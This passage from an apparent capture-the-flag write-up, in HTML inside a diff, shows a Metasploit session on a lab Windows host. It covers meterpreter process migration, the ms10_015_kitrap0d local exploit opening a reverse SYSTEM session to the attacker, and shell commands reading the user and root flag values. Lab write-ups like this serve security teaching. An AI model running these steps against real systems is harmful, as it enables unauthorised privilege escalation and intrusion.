+                &nbsp;3344&nbsp;&nbsp;2684&nbsp;&nbsp;rundll32.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:\WINDOWS\system32\rundll32.exe<br>
+                &nbsp;3948&nbsp;&nbsp;592&nbsp;&nbsp;&nbsp;wmiprvse.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                <br>
+                meterpreter&nbsp;&gt;&nbsp;migrate&nbsp;2684<br>
+                [*]&nbsp;Migrating&nbsp;from&nbsp;3344&nbsp;to&nbsp;2684...<br>
+                [*]&nbsp;Migration&nbsp;completed&nbsp;successfully.
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-5" name="h2-5"></a><strong></strong>
+        <h2><strong>5) ms10_015_kitrap0d</strong></h2><br>
+        The exploit <code>ms10_015_kitrap0d</code> will get you a SYSTEM shell.<br>
+        <br>
+        Set the target meterpreter session, local host, local port and <code>exploit</code> the target.<br>
+        A meterpreter session should open and you'll be <code>NT AUTHORITY\SYSTEM</code>.<br>
+            <div class="codebox">
+                msf5&nbsp;exploit(windows/iis/iis_webdav_scstoragepathfromurl)&nbsp;&gt;&nbsp;use&nbsp;exploit/windows/local/ms10_015_kitrap0d<br>
+                msf5&nbsp;exploit(windows/local/ms10_015_kitrap0d)&nbsp;&gt;&nbsp;show&nbsp;options<br>
+                <br>
+                Module&nbsp;options&nbsp;(exploit/windows/local/ms10_015_kitrap0d):<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Current&nbsp;Setting&nbsp;&nbsp;Required&nbsp;&nbsp;Description<br>
+                &nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;---------------&nbsp;&nbsp;--------&nbsp;&nbsp;-----------<br>
+                &nbsp;&nbsp;&nbsp;SESSION&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;session&nbsp;to&nbsp;run&nbsp;this&nbsp;module&nbsp;on.<br>
+                <br>
+                <br>
+                Exploit&nbsp;target:<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;Id&nbsp;&nbsp;Name<br>
+                &nbsp;&nbsp;&nbsp;--&nbsp;&nbsp;----<br>
+                &nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;Windows&nbsp;2K&nbsp;SP4&nbsp;-&nbsp;Windows&nbsp;7&nbsp;(x86)<br>
+                <br>
+                <br>
+                msf5&nbsp;exploit(windows/local/ms10_015_kitrap0d)&nbsp;&gt;&nbsp;set&nbsp;SESSION&nbsp;1<br>
+                SESSION&nbsp;=&gt;&nbsp;1<br>
+                msf5&nbsp;exploit(windows/local/ms10_015_kitrap0d)&nbsp;&gt;&nbsp;set&nbsp;LHOST&nbsp;10.10.14.3<br>
+                LHOST&nbsp;=&gt;&nbsp;10.10.14.3<br>
+                msf5&nbsp;exploit(windows/local/ms10_015_kitrap0d)&nbsp;&gt;&nbsp;set&nbsp;LPORT&nbsp;9002<br>
+                LPORT&nbsp;=&gt;&nbsp;9002<br>
+                msf5&nbsp;exploit(windows/local/ms10_015_kitrap0d)&nbsp;&gt;&nbsp;exploit<br>
+                <br>
+                [*]&nbsp;Started&nbsp;reverse&nbsp;TCP&nbsp;handler&nbsp;on&nbsp;10.10.14.3:9002&nbsp;<br>
+                [*]&nbsp;Launching&nbsp;notepad&nbsp;to&nbsp;host&nbsp;the&nbsp;exploit...<br>
+                [+]&nbsp;Process&nbsp;1880&nbsp;launched.<br>
+                [*]&nbsp;Reflectively&nbsp;injecting&nbsp;the&nbsp;exploit&nbsp;DLL&nbsp;into&nbsp;1880...<br>
+                [*]&nbsp;Injecting&nbsp;exploit&nbsp;into&nbsp;1880&nbsp;...<br>
+                [*]&nbsp;Exploit&nbsp;injected.&nbsp;Injecting&nbsp;payload&nbsp;into&nbsp;1880...<br>
+                [*]&nbsp;Payload&nbsp;injected.&nbsp;Executing&nbsp;exploit...<br>
+                [+]&nbsp;Exploit&nbsp;finished,&nbsp;wait&nbsp;for&nbsp;(hopefully&nbsp;privileged)&nbsp;payload&nbsp;execution&nbsp;to&nbsp;complete.<br>
+                [*]&nbsp;Sending&nbsp;stage&nbsp;(179779&nbsp;bytes)&nbsp;to&nbsp;10.10.10.15<br>
+                [*]&nbsp;Meterpreter&nbsp;session&nbsp;2&nbsp;opened&nbsp;(10.10.14.3:9002&nbsp;-&gt;&nbsp;10.10.10.15:1036)&nbsp;at&nbsp;2019-09-02&nbsp;14:59:11&nbsp;+0100<br>
+                <br>
+                meterpreter&nbsp;&gt;&nbsp;getuid<br>
+                Server&nbsp;username:&nbsp;NT&nbsp;AUTHORITY\SYSTEM
+            </div>
+        </div><br>
+        <br>
+        Go grab <code>user.txt</code> and <code>root.txt</code>.<br>
+            <div class="codebox">
+                meterpreter&nbsp;&gt;&nbsp;shell<br>
+                Process&nbsp;2864&nbsp;created.<br>
+                Channel&nbsp;1&nbsp;created.<br>
+                Microsoft&nbsp;Windows&nbsp;[Version&nbsp;5.2.3790]<br>
+                (C)&nbsp;Copyright&nbsp;1985-2003&nbsp;Microsoft&nbsp;Corp.<br>
+                <br>
+                c:\windows\system32\inetsrv&gt;cd&nbsp;"C:\Documents&nbsp;and&nbsp;Settings"<br>
+                cd&nbsp;"C:\Documents&nbsp;and&nbsp;Settings"<br>
+                <br>
+                C:\Documents&nbsp;and&nbsp;Settings&gt;dir<br>
+                dir<br>
+                &nbsp;Volume&nbsp;in&nbsp;drive&nbsp;C&nbsp;has&nbsp;no&nbsp;label.<br>
+                &nbsp;Volume&nbsp;Serial&nbsp;Number&nbsp;is&nbsp;246C-D7FE<br>
+                <br>
+                &nbsp;Directory&nbsp;of&nbsp;C:\Documents&nbsp;and&nbsp;Settings<br>
+                <br>
+                04/12/2017&nbsp;&nbsp;10:19&nbsp;PM&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.<br>
+                04/12/2017&nbsp;&nbsp;10:19&nbsp;PM&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;..<br>
+                04/12/2017&nbsp;&nbsp;09:48&nbsp;PM&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Administrator<br>
+                04/12/2017&nbsp;&nbsp;05:03&nbsp;PM&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;All&nbsp;Users<br>
+                04/12/2017&nbsp;&nbsp;10:19&nbsp;PM&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Lakis<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;File(s)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;bytes<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;5&nbsp;Dir(s)&nbsp;&nbsp;18,126,594,048&nbsp;bytes&nbsp;free<br>
+                <br>
+                C:\Documents&nbsp;and&nbsp;Settings&gt;type&nbsp;Lakis\Desktop\user.txt<br>
+                type&nbsp;Lakis\Desktop\user.txt<br>
+                700c5dc163014e22b3e408f8703f67d1<br>
+                C:\Documents&nbsp;and&nbsp;Settings&gt;type&nbsp;Administrator\Desktop\root.txt<br>
+                type&nbsp;Administrator\Desktop\root.txt<br>
+                aa4beed1c0584445ab463a6747bd06e9
+            </div>
+        </div>
+    </writeup>
+</section>
+
+</body>
+</html>
